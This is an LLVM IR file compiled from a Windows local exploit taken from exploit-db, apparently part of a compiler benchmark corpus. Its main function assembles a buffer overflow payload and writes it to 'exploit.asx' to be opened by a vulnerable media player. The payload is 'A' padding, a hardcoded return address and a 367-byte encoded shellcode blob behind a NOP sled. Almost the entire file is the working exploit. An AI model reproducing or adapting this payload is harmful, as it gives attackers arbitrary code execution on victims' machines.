; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_38457.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_38457.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.padding = private unnamed_addr constant [6 x i8] c"AAAAA\00", align 1
@__const.main.retn = private unnamed_addr constant [5 x i8] c"\92r#t\00", align 1
@__const.main.shellcode = private unnamed_addr constant [367 x i8] c"\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\DB\C8\D9t$\F4\BD\AF\93C\B4^1\C9\B1R1n\17\83\EE\FC\03\C1\80\A1A\E1O\A7\AA\19\90\C8#\FC\A1\C8Pu\91\F8\13\DB\1Erq\CF\95\F6^\E0\1E\BC\B8\CF\9F\ED\F9N\1C\EC-\B0\1D? \B1Z\22\C9\E33(|\137d\BD\98\0Bh\C5}\DB\8B\E4\D0W\D2&\D3\B4no\CB\D9K9`)'\B8\A0c\C8\17\8DK;i\CAl\A4\1C\22\8FY'\F1\ED\85\A2\E1VM\14\CDg\82\C3\86do\87\C0hnD{\94\FBk\AB\1C\BFOoD\1B\F16 \CA\0E(\8B\B3\AA#&\A7\C6n/\04\EB\90\AF\02|\E3\9D\8D\D6k\AEF\F1l\D1|E\E2,\7F\B6+\EB+\E6C\DASm\93\E3\81\22\C3Kz\83\B3+*k\D9\A3\15\8B\E2i>&\19\FA\ED\A7Uq\85\C5\95\84\EDCs\EC\01\02,\99\B8\0F\A68D\9A\C3{\CE)45'G&\A2\C7\12\14e\D7\880\E9JW\C0dw\C0\97!I\19}\DC\F0\B3c\1Dd\FB'\FAU\02\A6\8F\E2 \B8I\EAl\EC\05\BD:Z\E0\17\8D4\BA\C4G\D0;'X\A6Cb.F\F5\DBwy:\8C\7F\02&,\7F\D9\E2\\\CACB\F5\93\16\D6\98#\CD\15\A5\A7\E7\E5R\B7\82\E0\1F\7F\7F\990\EA\7F\0E0?\00", align 16
@.str = private unnamed_addr constant [12 x i8] c"exploit.asx\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"w\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca [6 x i8], align 1
  %5 = alloca [5 x i8], align 1
  %6 = alloca [367 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32*, align 8
  store i32 0, i32* %1, align 4
  %10 = call i8* @malloc(i32 255)
  store i8* %10, i8** %3, align 8
  store i32 0, i32* %2, align 4
  br label %11

11:                                               ; preds = %24, %0
  %12 = load i32, i32* %2, align 4
  %13 = icmp slt i32 %12, 255
  br i1 %13, label %14, label %27

14:                                               ; preds = %11
  %15 = bitcast [6 x i8]* %4 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %15, i8* align 1 getelementptr inbounds ([6 x i8], [6 x i8]* @__const.main.padding, i32 0, i32 0), i64 6, i1 false)
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %2, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = getelementptr inbounds [6 x i8], [6 x i8]* %4, i64 0, i64 0
  %21 = getelementptr inbounds [6 x i8], [6 x i8]* %4, i64 0, i64 0
  %22 = call i32 @strlen(i8* %21)
  %23 = call i32 @memcpy(i8* %19, i8* %20, i32 %22)
  br label %24

24:                                               ; preds = %14
  %25 = load i32, i32* %2, align 4
  %26 = add nsw i32 %25, 5
  store i32 %26, i32* %2, align 4
  br label %11

27:                                               ; preds = %11
  %28 = load i8*, i8** %3, align 8
  %29 = load i8*, i8** %3, align 8
  %30 = call i32 @_msize(i8* %29)
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %28, i64 %31
  %33 = getelementptr inbounds i8, i8* %32, i64 -1
  %34 = call i32 @memset(i8* %33, i32 0, i32 1)
  %35 = bitcast [5 x i8]* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %35, i8* align 1 getelementptr inbounds ([5 x i8], [5 x i8]* @__const.main.retn, i32 0, i32 0), i64 5, i1 false)
  %36 = bitcast [367 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %36, i8* align 16 getelementptr inbounds ([367 x i8], [367 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 367, i1 false)
  %37 = load i8*, i8** %3, align 8
  %38 = call i32 @_msize(i8* %37)
  %39 = getelementptr inbounds [5 x i8], [5 x i8]* %5, i64 0, i64 0
  %40 = call i32 @strlen(i8* %39)
  %41 = add nsw i32 %38, %40
  %42 = getelementptr inbounds [367 x i8], [367 x i8]* %6, i64 0, i64 0
  %43 = call i32 @strlen(i8* %42)
  %44 = add nsw i32 %41, %43
  store i32 %44, i32* %7, align 4
  %45 = load i32, i32* %7, align 4
  %46 = call i8* @malloc(i32 %45)
  store i8* %46, i8** %8, align 8
  %47 = load i8*, i8** %8, align 8
  %48 = load i8*, i8** %3, align 8
  %49 = load i8*, i8** %3, align 8
  %50 = call i32 @_msize(i8* %49)
  %51 = call i32 @memcpy(i8* %47, i8* %48, i32 %50)
  %52 = load i8*, i8** %8, align 8
  %53 = load i8*, i8** %3, align 8
  %54 = call i32 @_msize(i8* %53)
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i8, i8* %52, i64 %55
  %57 = getelementptr inbounds [5 x i8], [5 x i8]* %5, i64 0, i64 0
  %58 = getelementptr inbounds [5 x i8], [5 x i8]* %5, i64 0, i64 0
  %59 = call i32 @strlen(i8* %58)
  %60 = call i32 @memcpy(i8* %56, i8* %57, i32 %59)
  %61 = load i8*, i8** %8, align 8
  %62 = load i8*, i8** %3, align 8
  %63 = call i32 @_msize(i8* %62)
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8, i8* %61, i64 %64
  %66 = getelementptr inbounds [5 x i8], [5 x i8]* %5, i64 0, i64 0
  %67 = call i32 @strlen(i8* %66)
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %65, i64 %68
  %70 = getelementptr inbounds [367 x i8], [367 x i8]* %6, i64 0, i64 0
  %71 = getelementptr inbounds [367 x i8], [367 x i8]* %6, i64 0, i64 0
  %72 = call i32 @strlen(i8* %71)
  %73 = call i32 @memcpy(i8* %69, i8* %70, i32 %72)
  %74 = load i8*, i8** %8, align 8
  %75 = load i32, i32* %7, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %74, i64 %76
  %78 = getelementptr inbounds i8, i8* %77, i64 -1
  %79 = call i32 @memset(i8* %78, i32 0, i32 1)
  %80 = call i32* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32* %80, i32** %9, align 8
  %81 = load i32*, i32** %9, align 8
  %82 = load i8*, i8** %8, align 8
  %83 = call i32 @fprintf(i32* %81, i8* %82)
  %84 = load i32*, i32** %9, align 8
  %85 = call i32 @fclose(i32* %84)
  ret i32 0
}

declare dso_local i8* @malloc(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @_msize(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
